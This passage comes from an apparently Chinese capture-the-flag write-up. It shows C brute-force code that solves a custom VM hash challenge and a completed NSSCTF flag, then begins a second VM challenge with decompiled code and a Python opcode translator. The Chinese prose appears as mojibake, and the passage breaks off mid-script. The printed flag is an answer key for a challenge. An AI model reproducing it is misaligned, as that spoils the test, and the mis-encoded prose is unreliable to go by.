class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// æ‰€æœ‰å¯èƒ½çš„å­—ç¬¦</span></span><br><span class="line"><span class="type">char</span> characters[] = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ &quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆå§‹åŒ–å¯„å­˜å™¨</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> reg[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹æ¯ä¸€ä¸ªç»„åˆè¿›è¡Œæ£€æŸ¥</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(characters); i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(characters); j++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="built_in">strlen</span>(characters); k++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>; l &lt; <span class="built_in">strlen</span>(characters); l++) &#123;</span><br><span class="line"><span class="type">char</span> s[<span class="number">40</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">s[<span class="number">36</span>] = characters[i];</span><br><span class="line">s[<span class="number">37</span>] = characters[j];</span><br><span class="line">s[<span class="number">38</span>] = characters[k];</span><br><span class="line">s[<span class="number">39</span>] = characters[l];</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰§è¡Œç»™å®šçš„æ“ä½œ</span></span><br><span class="line">reg[<span class="number">1</span>] = s[<span class="number">36</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">24</span>;</span><br><span class="line">reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">9</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] = s[<span class="number">37</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">16</span>;</span><br><span class="line">reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] = s[<span class="number">38</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">8</span>;</span><br><span class="line">reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] = s[<span class="number">39</span>];</span><br><span class="line">reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">reg[<span class="number">1</span>] = reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">3</span>] = <span class="number">32</span>;</span><br><span class="line">reg[<span class="number">1</span>] *= reg[<span class="number">3</span>];</span><br><span class="line">reg[<span class="number">4</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">17</span>;</span><br><span class="line">reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">5</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] = reg[<span class="number">5</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">5</span>];</span><br><span class="line">reg[<span class="number">9</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">3</span>] = <span class="number">32</span>;</span><br><span class="line">reg[<span class="number">1</span>] *= reg[<span class="number">3</span>];</span><br><span class="line">reg[<span class="number">4</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">17</span>;</span><br><span class="line">reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">5</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] = reg[<span class="number">5</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ£€æŸ¥ç»“æœ</span></span><br><span class="line"><span class="keyword">if</span> (reg[<span class="number">1</span>] == <span class="number">3474130140</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Found matching combination: %c%c%c%c\n&quot;</span>, s[<span class="number">36</span>], s[<span class="number">37</span>], s[<span class="number">38</span>], s[<span class="number">39</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No matching combination found.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//b06c</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// æ‰€æœ‰å¯èƒ½çš„å­—ç¬¦</span></span><br><span class="line">    <span class="type">char</span> characters[] = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–å¯„å­˜å™¨</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> reg[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯¹æ¯ä¸€ä¸ªç»„åˆè¿›è¡Œæ£€æŸ¥</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(characters); i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(characters); j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="built_in">strlen</span>(characters); k++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>; l &lt; <span class="built_in">strlen</span>(characters); l++) &#123;</span><br><span class="line">                    <span class="type">char</span> s[<span class="number">44</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">                    s[<span class="number">40</span>] = characters[i];</span><br><span class="line">                    s[<span class="number">41</span>] = characters[j];</span><br><span class="line">                    s[<span class="number">42</span>] = characters[k];</span><br><span class="line">                    s[<span class="number">43</span>] = characters[l];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// æ‰§è¡Œç»™å®šçš„æ“ä½œ</span></span><br><span class="line">                    reg[<span class="number">1</span>] = s[<span class="number">40</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">24</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">9</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] = s[<span class="number">41</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">16</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] = s[<span class="number">42</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">8</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] = s[<span class="number">43</span>];</span><br><span class="line">                    reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                    reg[<span class="number">1</span>] = reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">3</span>] = <span class="number">32</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] *= reg[<span class="number">3</span>];</span><br><span class="line">                    reg[<span class="number">4</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">17</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">5</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] = reg[<span class="number">5</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">5</span>];</span><br><span class="line">                    reg[<span class="number">9</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">3</span>] = <span class="number">32</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] *= reg[<span class="number">3</span>];</span><br><span class="line">                    reg[<span class="number">4</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">17</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">5</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] = reg[<span class="number">5</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// æ£€æŸ¥ç»“æœ</span></span><br><span class="line">                    <span class="keyword">if</span> (reg[<span class="number">1</span>] == <span class="number">674991748</span>) &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Found matching combination: %c%c%c%c\n&quot;</span>, s[<span class="number">40</span>], s[<span class="number">41</span>], s[<span class="number">42</span>], s[<span class="number">43</span>]);</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No matching combination found.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//dc23</span></span><br></pre></td></tr></table></figure><p>æœ€ååˆå¹¶ä¸€ä¸‹flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">NSSCTF</span>&#123;<span class="number">16584</span>abc45baff901c59dde3b1bb6701a254b06cdc23&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜æœ€åå¾ˆæ˜æ˜¾æ˜¯ä¸èƒ½ç›´æ¥é€†å‘çš„ï¼Œé‚£å°±éœ€è¦çˆ†ç ´ï¼Œæ‰€ä»¥ç¿»è¯‘opcodeçš„æ—¶å€™å†™æˆpythonè¯­æ³•æˆ–è€…cè¯­æ³•å°±ä¼šæ›´æ–¹ä¾¿ï¼Œç„¶åæ³¨æ„ä¸€ä¸‹çˆ†ç ´çš„æ—¶å€™çš„å¤§ç«¯åºå’Œå°ç«¯åºå°±å¥½äº†</p><h2 id="ç¾ŠåŸæ¯2023-vm-wo">ç¾ŠåŸæ¯2023 vm_wo</h2><p>è¿™é“é¢˜æ˜¯æˆ‘ç¬¬ä¸€æ¬¡é‡è§macçš„é¢˜</p><p>ä¸€å¼€å§‹ç”¨ida 8.3æ‰“å¼€ï¼Œä½†æ˜¯ä¸èƒ½åç¼–è¯‘ï¼Œå»ç½‘ä¸Šçœ‹wpå‘ç°å¥½åƒéƒ½èƒ½åç¼–è¯‘ï¼Œäºæ˜¯è¯•äº†è¯•7.7ç»“æœå°±å¯ä»¥äº†&gt;_&lt;</p><p>æ‰“å¼€ä¹‹åç›´æ¥å»ä¸»å‡½æ•°ï¼Œç›´æ¥æ‹¿åˆ°äº†last</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0xDF</span>, <span class="number">0xD5</span>, <span class="number">0xF1</span>, <span class="number">0xD1</span>, <span class="number">0xFF</span>, <span class="number">0xDB</span>, <span class="number">0xA1</span>, <span class="number">0xA5</span>, <span class="number">0x89</span>, <span class="number">0xBD</span>, <span class="number">0xE9</span>, <span class="number">0x95</span>, <span class="number">0xB3</span>, <span class="number">0x9D</span>, <span class="number">0xE9</span>, <span class="number">0xB3</span>, <span class="number">0x85</span>, <span class="number">0x99</span>, <span class="number">0x87</span>, <span class="number">0xBF</span>, <span class="number">0xE9</span>, <span class="number">0xB1</span>, <span class="number">0x89</span>, <span class="number">0xE9</span>, <span class="number">0x91</span>, <span class="number">0x89</span>, <span class="number">0x89</span>, <span class="number">0x8F</span>, <span class="number">0xAD</span>]</span><br></pre></td></tr></table></figure><p>åœ¨ä¹‹å‰è¿›è¡Œäº†myoperateè¿™ä¸ªå‡½æ•°ï¼Œåº”è¯¥æ˜¯encode<br>ç„¶åå°±æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">myoperate</span><span class="params">(<span class="type">char</span> *flag, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 i; <span class="comment">// x20</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">15</span>]; <span class="comment">// [xsp+8h] [xbp-98h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">15</span>]; <span class="comment">// [xsp+18h] [xbp-88h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">15</span>]; <span class="comment">// [xsp+28h] [xbp-78h] BYREF</span></span><br><span class="line">  <span class="type">char</span> code[<span class="number">16</span>]; <span class="comment">// [xsp+38h] [xbp-68h] BYREF</span></span><br><span class="line">  __int64 v8; <span class="comment">// [xsp+48h] [xbp-58h]</span></span><br><span class="line"></span><br><span class="line">  LODWORD(i) = len;</span><br><span class="line">  v8 = <span class="number">0x100000CFEEDFA</span>LL;</span><br><span class="line">  dword_100008003 = <span class="number">0xBEEDBEEF</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ptrace(<span class="number">0</span>, <span class="number">0</span>, (<span class="type">caddr_t</span>)<span class="number">1</span>, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)i &gt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    i = (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)code = <span class="number">0x20D01011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)&amp;code[<span class="number">7</span>] = <span class="number">0x300010201180702</span>LL;</span><br><span class="line">      code[<span class="number">2</span>] = *flag;</span><br><span class="line">      interpretBytecode(code, <span class="number">15</span>);</span><br><span class="line">      *(_QWORD *)v6 = <span class="number">0x20D02011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)&amp;v6[<span class="number">7</span>] = <span class="number">0x400010201180602</span>LL;</span><br><span class="line">      v6[<span class="number">2</span>] = vm.body[<span class="number">0</span>];</span><br><span class="line">      interpretBytecode(v6, <span class="number">15</span>);</span><br><span class="line">      *(_QWORD *)v5 = <span class="number">0x20D03011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)&amp;v5[<span class="number">7</span>] = <span class="number">0x500010201180502</span>LL;</span><br><span class="line">      v5[<span class="number">2</span>] = vm.body[<span class="number">0</span>];</span><br><span class="line">      interpretBytecode(v5, <span class="number">15</span>);</span><br><span class="line">      *(_QWORD *)v4 = <span class="number">0x20D04011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)&amp;v4[<span class="number">7</span>] = <span class="number">0x600010201180402</span>LL;</span><br><span class="line">      v4[<span class="number">2</span>] = vm.body[<span class="number">0</span>];</span><br><span class="line">      interpretBytecode(v4, <span class="number">15</span>);</span><br><span class="line">      *flag++ = ((<span class="type">unsigned</span> __int8)vm.body[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>) | (<span class="number">8</span> * vm.body[<span class="number">0</span>]);</span><br><span class="line">      --i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( i );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯opcodeç”Ÿæˆçš„ä½ç½®ï¼Œæ³¨æ„ä¸€å…±æœ‰15ä½åŒæ—¶ç¬¬äºŒä½è¢«æ¢æˆäº†flagçš„å€¼<br>ç›¸å½“äºæ¯è½®å¯¹ä¸€ä¸ªå­—ç¬¦åŠ å¯†<br>æ‰€ä»¥å†™è§£å¯†å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">t = [[<span class="number">0x1a</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0x19</span>,<span class="number">0x1</span>,<span class="number">0x1</span>,<span class="number">0xd</span>,<span class="number">0x2</span>,<span class="number">0x7</span>,<span class="number">0x18</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x3</span>],</span><br><span class="line">     [<span class="number">0x1a</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0x19</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0xd</span>,<span class="number">0x2</span>,<span class="number">0x6</span>,<span class="number">0x18</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x4</span>],</span><br><span class="line">     [<span class="number">0x1a</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0x19</span>,<span class="number">0x1</span>,<span class="number">0x3</span>,<span class="number">0xd</span>,<span class="number">0x2</span>,<span class="number">0x5</span>,<span class="number">0x18</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x5</span>],</span><br><span class="line">    [ <span class="number">0x1a</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0x19</span>,<span class="number">0x1</span>,<span class="number">0x4</span>,<span class="number">0xd</span>,<span class="number">0x2</span>,<span class="number">0x4</span>,<span class="number">0x18</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x6</span>]]</span><br><span class="line"><span class="comment"># 0xffç”¨ä½œæ ‡å¿—,è¡¨æ˜è¿™é‡Œä½¿ç”¨äº†ä¸Šä¸€æ¬¡åŠ å¯†åçš„è¿™ä¸€ä½flag</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> t:</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">15</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># this_code = b[i]</span></span><br><span class="line">            code0 = b[i]</span><br><span class="line">            code1 = b[i+<span class="number">1</span>]</span><br><span class="line">            code2 = b[i+<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">if</span> code0 == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>], s[<span class="subst">&#123;code2&#125;</span>] = s[<span class="subst">&#123;code2&#125;</span>], s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] ^= s[<span class="subst">&#123;code2&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span 